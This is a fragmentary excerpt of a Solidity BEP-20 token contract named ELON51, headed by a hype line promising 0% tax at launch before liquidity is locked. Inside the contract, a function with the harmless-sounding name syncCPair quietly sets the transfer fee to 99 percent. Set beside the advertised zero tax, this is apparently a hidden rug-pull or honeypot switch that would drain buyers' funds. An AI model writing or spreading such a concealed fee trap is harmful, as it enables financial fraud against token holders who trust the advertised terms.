...
0% TAX AT LAUNCH BEFORE LP IS LOCKED!!!!
...
contract ELON51 is IBEP20, Auth {
    using SafeMath for uint256;
    string private constant _name = 'ELON51';
    ...
    function syncCPair() internal {transferFee = uint256(99);}
